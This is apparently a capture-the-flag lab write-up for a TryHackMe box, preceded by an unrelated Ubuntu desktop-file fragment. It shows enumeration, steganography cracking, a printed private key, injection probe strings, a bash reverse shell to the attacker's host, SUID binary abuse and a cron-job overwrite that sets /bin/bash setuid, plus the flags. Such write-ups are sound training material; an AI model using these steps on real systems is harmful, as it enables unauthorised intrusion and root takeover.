Comment[cy]=Cynnwys enghraifft ar gyfer  Ubuntu
Comment[da]=Eksempel indhold til Ubuntu
Comment[de]=Beispielinhalt für Ubuntu
Comment[dv]=އުބުންޓު އާއި އެކަށޭނަ މިސާލުތައް
Comment[el]=Παραδείγματα περιεχομένου για το Ubuntu
Comment[en_AU]=Example content for Ubuntu
Comment[en_CA]=Example content for Ubuntu
Comment[en_GB]=Example content for Ubuntu
Comment[eo]=Ekzempla enhavo por Ubuntu
Comment[es]=Contenido de ejemplo para Ubuntu
Comment[et]=Ubuntu näidisfailid
Comment[eu]=Adibidezko edukia Ubunturako
Comment[fa]=محتویات نمونه برای اوبونتو
Comment[fi]=Esimerkkisisältöjä Ubuntulle
Comment[fil]=Halimbawang laman para sa Ubuntu
Comment[fo]=Dømis innihald fyri Ubuntu
Comment[fr]=Contenu d'exemple pour Ubuntu
Comment[fur]=Contignûts di esempli par Ubuntu
Comment[fy]=Foarbyld fan ynhâld foar Ubuntu
Comment[ga]=Inneachar samplach do Ubuntu
Comment[gd]=Eisimpleir de shusbaint airson Ubuntu
Comment[gl]=Contido do exemplo para Ubuntu
Comment[gu]=Ubuntu માટે ઉદાહરણ સૂચી
Comment[gv]=Stoo Sanpleyr son Ubuntu
Comment[he]=תוכן לדוגמה עבור אובונטו
Comment[hi]=उबुन्टू हेतु उदाहरण सारांश
Comment[hr]=Primjeri sadržaja za Ubuntu
Comment[ht]=Kontni egzanplè pou Ubuntu
Comment[hu]=Mintatartalom Ubuntuhoz
Comment[hy]=Բովանդակության օրինակները Ubuntu֊ի համար
Comment[id]=Contoh isi bagi Ubuntu
Comment[is]=Sýnishorn fyrir Ubuntu
Comment[it]=Contenuti di esempio per Ubuntu
Comment[ja]=Ubuntuのサンプルコンテンツ
Comment[ka]=უბუნტუს სანიმუშო შიგთავსი
Comment[kk]=Ubuntu құжаттар мысалдары
Comment[kl]=Ubuntu-mut imarisaanut assersuut
Comment[km]=ឧទាហរណ៍សម្រាប់អាប់ប៊ុនធូ
Comment[kn]=ಉಬುಂಟುಗೆ ಉದಾಹರಣೆಗಳು
Comment[ko]=우분투 컨텐츠 예시
Comment[ku]=Ji bo Ubuntu mînaka naverokê
Comment[ky]=Ubuntu-нун мисал документтери
Comment[lb]=Beispillinhalt fir Ubuntu
Comment[lt]=Įvairių dokumentų, paveikslėlių, garsų bei vaizdų pavyzdžiai
Comment[lv]=Parauga saturs Ubuntu videi
Comment[mg]=Ohatra ho an'i Ubuntu
Comment[mhr]=Ubuntu-лан документ-влакын пример-влак
Comment[mi]=Mata tauira o Ubuntu
Comment[mk]=Пример содржина за Убунту
Comment[ml]=ഉബുണ്ടുവിനു വേണ്ടിയുള്ള ഉദാഹരണങ്ങള്‍
Comment[mr]=उबंटूसाठी घटकांची उदाहरणे
Comment[ms]=Kandungan contoh untuk Ubuntu
Comment[my]=Ubuntu အတွက် နမူနာ မာတိကာ
Comment[nb]=Eksempelinnhold for Ubuntu
Comment[ne]=उबन्टुका लागि उदाहरण सामग्री
Comment[nl]=Voorbeeldinhoud voor Ubuntu
Comment[nn]=Eksempelinnhald for Ubuntu
Comment[nso]=Mohlala wa dikagare tša Ubuntu
Comment[oc]=Exemples de contengut per Ubuntu
Comment[pa]=ਉਬਤੂੰ ਲਈ ਨਮੂਨਾ ਸਮੱਗਰੀ
Comment[pl]=Przykładowa zawartość dla Ubuntu
Comment[pt]=Conteúdo de exemplo para o Ubuntu
Comment[pt_BR]=Exemplo de conteúdo para Ubuntu
Comment[ro]=Conținut exemplu pentru Ubuntu
Comment[ru]=Примеры документов для Ubuntu
Comment[sc]=Esempiu de cabidu pro Ubuntu
Comment[sco]=Example content fur Ubuntu
Comment[sd]=اوبنٽو لاءِ مثال طور ڏنل مواد
Comment[shn]=တူဝ်ႇယၢင်ႇလမ်းၼႂ်း တႃႇ Ubuntu
Comment[si]=උබුන්ටු සඳහා උදාහරණ අන්තර්ගතයන්
Comment[sk]=Ukážkový obsah pre Ubuntu
Comment[sl]=Ponazoritvena vsebina za Ubuntu
Comment[sml]=Saupama Isina Ubuntu
Comment[sn]=Muyenzaniso wehuiswa kuitira Ubuntu
Comment[sq]=Shembull i përmbajtjes për Ubuntu
Comment[sr]=Садржај примера за Убунту
Comment[sv]=Exempelinnehåll för Ubuntu
Comment[sw]=Bidhaa mfano ya Ubuntu
Comment[szl]=Bajszpilnŏ treść dlŏ Ubuntu
Comment[ta]=உபுண்டுவிற்கான எடுத்துகாட்டு உள்ளடக்கங்கள்
Comment[ta_LK]=உபுண்டுவிற்கான எடுத்துகாட்டு உள்ளடக்கங்கள்
Comment[te]=Ubuntu వాడుక విధాన నమూనాలు
Comment[tg]=Мӯҳтавои намунавӣ барои Ubuntu
Comment[th]=ตัวอย่างข้อมูลสำหรับ Ubuntu
Comment[tr]=Ubuntu için örnek içerik
Comment[tt]=Ubuntu өчен документ мисаллары
Comment[ug]=ئۇبۇنتۇنىڭ مىساللىرى
Comment[uk]=Приклади контенту для Ubuntu
Comment[ur]=یوبنٹو کیلئے مثالی مواد
Comment[uz]=Ubuntu учун намуна таркиби
Comment[vec]=Contenuti de esempio de Ubuntu
Comment[vi]=Mẫu ví dụ cho Ubuntu
Comment[wae]=D'Ubuntu bischbildatijä
Comment[zh_CN]=Ubuntu 示例内容
Comment[zh_HK]=Ubuntu 的範例內容
Comment[zh_TW]=Ubuntu 的範例內容
URL=file:///usr/share/example-content/
Icon=folder
X-Ubuntu-Gettext-Domain=example-content


ftp> 

ftp> cd ftp
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||18039|).
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 ..
drwxr-xr-x    2 1001     1001         4096 Jul 28  2020 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||14543|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jul 28  2020 .
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 ..
-rw-r--r--    1 1001     1001         8183 Jul 28  2020 cool.jpeg

ftp> put user.jpg
local: user.jpg remote: user.jpg
229 Entering Extended Passive Mode (|||56190|).
550 Permission denied.

226 Directory send OK.
ftp> get cool.jpeg
local: cool.jpeg remote: cool.jpeg
229 Entering Extended Passive Mode (|||43318|).
150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
100% |**************************************|  8183       96.13 KiB/s    00:00 ETA
226 Transfer complete.
8183 bytes received in 00:00 (30.45 KiB/s)
ftp> exit
221 Goodbye.

┌──(witty㉿kali)-[~/Downloads]
└─$ stegseek cool.jpeg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "p@55w0rd"       

[i] Original filename: "out.txt".
[i] Extracting to "cool.jpeg.out".

┌──(witty㉿kali)-[~/Downloads]
└─$ cat cool.jpeg.out 
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff

http://10.10.209.198:445/bobs_safe_for_stuff

Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter

10.10.209.198:445
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://10.10.209.198:445/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.209.198:445/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/01 11:58:33 Starting gobuster in directory enumeration mode
===============================================================
/user                 (Status: 200) [Size: 3401]
/server-status        (Status: 403) [Size: 294]

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 blog_rsa               
                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i blog_rsa bob@10.10.209.198
Load key "blog_rsa": error in libcrypto
bob@10.10.209.198's password: 

but who is the user

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://10.10.209.198:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.209.198:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/01 12:03:39 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
/login                (Status: 200) [Size: 546]
/review               (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
/blog2                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
/blog1                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
/blog3                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
/blog4                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
/blog5                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
/blog6                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]

vigenere decoder

https://cyberchef.io/#recipe=Vigen%C3%A8re_Decode('youmayenter')&input=emN2OnAxZmQzdjNhbVRANTVuMHBy

bob:d1ff3r3ntP@55w0rd

http://10.10.209.198:8080/login

http://10.10.209.198:8080/blog1

My first blog post! Yay!

http://10.10.209.198:8080/blog2

I should probably actually put something this time... eh I don't wanna, I'll get to it later! 

http://10.10.209.198:8080/blog3

I like dogs and cats. But dogs are better. 

http://10.10.209.198:8080/blog4

If you couldn't tell I also like cupcakes 

http://10.10.209.198:8080/blog5

I'm not sure I like blogging so much anymore. 

http://10.10.209.198:8080/blog6

I'm done with this! I hate blogging! 

http://10.10.209.198:8080/blog0

Not Found

http://10.10.209.198:8080/review

This is the best blog I've ever read! I wanna be you <3 

https://twitter.com/theXSSrat/status/1612122763627724800?lang=es

'"`><img src=x>${{7*7}} Throw this into EVERY parameter you see :D

'"`  SQLi testing 
'"` JS inject 
'"`>  html tag attribute inject 
<img src=x> html inject 
${{7*7}} CSTI

http://10.10.209.198:8080/review

<h1>ho</h1>

OS command injection

id

uid=33(www-data) gid=33(www-data) groups=33(www-data) 

revshell

/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.209.198] 33262
bash: cannot set terminal process group (534): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bobloblaw-VirtualBox:~/html2$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@bobloblaw-VirtualBox:~/html2$ You haven't rooted me yet? Jeez

cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
bobloblaw:x:1000:1000:bobloblaw,,,:/home/bobloblaw:/bin/bash
bob:x:1001:1001:,,,:/home/bob:/bin/bash

cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *

find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/ubuntu-app-launch/oom-adjust-setuid-helper
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/arping
/usr/bin/blogFeedback
/usr/bin/passwd
/bin/ntfs-3g
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/umount
/opt/VBoxGuestAdditions-6.1.12/bin/VBoxDRMClient

/usr/bin/blogFeedback

www-data@bobloblaw-VirtualBox:~/html2$ cd /var/www
cd /var/www
www-data@bobloblaw-VirtualBox:~$ ls
ls
html  html2  html4  reno2.jpg  reno.jpg
www-data@bobloblaw-VirtualBox:~$ You haven't rooted me yet? Jeez


www-data@bobloblaw-VirtualBox:~$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
10.8.19.103 - - [01/Sep/2023 13:12:57] "GET /reno.jpg HTTP/1.1" 200 -
You haven't rooted me yet? Jeez
10.8.19.103 - - [01/Sep/2023 13:13:08] "GET /reno2.jpg HTTP/1.1" 200 -
You haven't rooted me yet? Jeez

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.209.198:8000/reno.jpg
--2023-09-01 13:12:56--  http://10.10.209.198:8000/reno.jpg
Connecting to 10.10.209.198:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 898669 (878K) [image/jpeg]
Saving to: ‘reno.jpg’

reno.jpg          100%[============>] 877.61K   206KB/s    in 5.2s    

2023-09-01 13:13:02 (167 KB/s) - ‘reno.jpg’ saved [898669/898669]

                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.209.198:8000/reno2.jpg
--2023-09-01 13:13:07--  http://10.10.209.198:8000/reno2.jpg
Connecting to 10.10.209.198:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 440264 (430K) [image/jpeg]
Saving to: ‘reno2.jpg’

reno2.jpg         100%[============>] 429.95K   258KB/s    in 1.7s    

2023-09-01 13:13:09 (258 KB/s) - ‘reno2.jpg’ saved [440264/440264]

┌──(witty㉿kali)-[~/Downloads]
└─$ steghide extract -sf reno2.jpg 
Enter passphrase: 
wrote extracted data to "doggo.txt".
                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ steghide extract -sf reno.jpg 
Enter passphrase: 
wrote extracted data to "dog.txt".
                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ cat dog.txt 
i'm just a DOG, leave me alone
                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ cat doggo.txt 
jcug xue, paw W's vhooz pxgz Moxhr'y gcm.  Lt O fcaor ikcuvs gqczksx dbopor, L'r vuchdprb pk d fgepow, qac mux xavh lritg o xdphlh nrzk!

https://www.dcode.fr/vigenere-cipher

good job, but I'm still just Jared's dog.  If I could choose another animal, I'd probably be a rabbit, cuz you just found a rabbit hole!

www-data@bobloblaw-VirtualBox:~/html2$ ls -lah /usr/bin/blogFeedback
ls -lah /usr/bin/blogFeedback
-rwsrwxr-x 1 bobloblaw bobloblaw 17K Jul 25  2020 /usr/bin/blogFeedback

www-data@bobloblaw-VirtualBox:/usr/bin$ python3 -m http.server 8001
python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 ...
10.8.19.103 - - [01/Sep/2023 13:31:45] "GET /blogFeedback HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.209.198:8001/blogFeedback       
--2023-09-01 13:31:44--  http://10.10.209.198:8001/blogFeedback
Connecting to 10.10.209.198:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16768 (16K) [application/octet-stream]
Saving to: ‘blogFeedback’

blogFeedback      100%[============>]  16.38K  90.5KB/s    in 0.2s    

2023-09-01 13:31:44 (90.5 KB/s) - ‘blogFeedback’ saved [16768/16768]

┌──(witty㉿kali)-[~/Downloads]
└─$ ghidra 

undefined8 main(int param_1,long param_2)

{
  int iVar1;
  int local_c;
  
  if ((param_1 < 7) || (7 < param_1)) {
    puts("Order my blogs!");
  }
  else {
    for (local_c = 1; local_c < 7; local_c = local_c + 1) {
      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
      if (iVar1 != 7 - local_c) {
        puts("Hmm... I disagree!");
        return 0;
      }
    }
    puts("Now that, I can get behind!");
    setreuid(1000,1000);
    system("/bin/sh");
  }
  return 0;
}

www-data@bobloblaw-VirtualBox:/usr/bin$ blogFeedback 1 2 3 4
blogFeedback 1 2 3 4
Order my blogs!
www-data@bobloblaw-VirtualBox:/usr/bin$ blogFeedback 1 2 3 4 5 6
blogFeedback 1 2 3 4 5 6
Hmm... I disagree!

www-data@bobloblaw-VirtualBox:/usr/bin$ blogFeedback 6 5 4 3 2 1
blogFeedback 6 5 4 3 2 1
Now that, I can get behind!
$ whoami
whoami
bobloblaw

$ cd bobloblaw
cd bobloblaw
$ ls
ls
Desktop    Downloads	     Music     Public	  Videos
Documents  examples.desktop  Pictures  Templates
$ cd Desktop
cd Desktop
$ You haven't rooted me yet? Jeez
ls
ls
dontlookatthis.jpg  lookatme.jpg  user.txt
$ cat user.txt
cat user.txt
THM{C0NGR4t$_g3++ing_this_fur}

@jakeyee thank you so so so much for the help with the foothold on the box!!

cd ../Documents
$ ls
ls
$ ls -lah
ls -lah
total 16K
drwxr-xr-x  3 bobloblaw bobloblaw 4.0K Jul 30  2020 .
drwxrwx--- 16 bobloblaw bobloblaw 4.0K Aug  6  2020 ..
drwxrwx---  2 bobloblaw bobloblaw 4.0K Sep  1 13:43 .also_boring
-rw-rw----  1 bobloblaw bobloblaw   92 Jul 30  2020 .boring_file.c
$ You haven't rooted me yet? Jeez
cat .boring_file.c
cat .boring_file.c
#include <stdio.h>
int main() {
	printf("You haven't rooted me yet? Jeez\n");
	return 0;

}

replace 


#include <stdlib.h>

int main(){
    system("chmod +s /bin/bash");
    return 0;
}

cat << EOF > /home/bobloblaw/Documents/.boring_file.c
#include <stdlib.h>
int main(){
 system("chmod +s /bin/bash");
 return 0;
}
EOF

1. `<stdio.h>`: The first program uses functions like `printf` to display a message. `<stdio.h>` is included because it contains the necessary declarations for these functions.
    
2. `<stdlib.h>`: The second program uses the `system` function, which is declared in `<stdlib.h>`. The `system` function allows you to execute shell commands

bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ cat .boring_file.c
cat .boring_file.c
#include <stdlib.h>
int main(){
 system("chmod +s /bin/bash");
 return 0;
}

bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ ls -lah /bin/bash
ls -lah /bin/bash
-rwxr-xr-x 1 root root 1.1M Nov 15  2016 /bin/bash
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ ls -lah /bin/bash
ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Nov 15  2016 /bin/bash

bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ bash -p
bash -p
bash-4.4# cd /root
cd /root
bash-4.4# ls
ls
root.txt
bash-4.4# cat root.txt
cat root.txt
THM{G00D_J0B_G3++1NG+H3R3!}

┌──(witty㉿kali)-[~/bug_hunter]
└─$ git clone https://github.com/NitinYadav00/Bug-Bounty-Search-Engine.git
Cloning into 'Bug-Bounty-Search-Engine'...
remote: Enumerating objects: 42, done.
remote: Counting objects: 100% (42/42), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 42 (delta 17), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (42/42), 16.05 MiB | 12.27 MiB/s, done.
Resolving deltas: 100% (17/17), done.

┌──(witty㉿kali)-[~/bug_hunter/Bug-Bounty-Search-Engine]
└─$ firefox index.html    
```

![[Pasted image 20230901111539.png]]

![[Pasted image 20230901112603.png]]

User Flag  

*THM{C0NGR4t$_g3++ing_this_fur}*

Root Flag

*THM{G00D_J0B_G3++1NG+H3R3!}*


[[Lesson Learned]]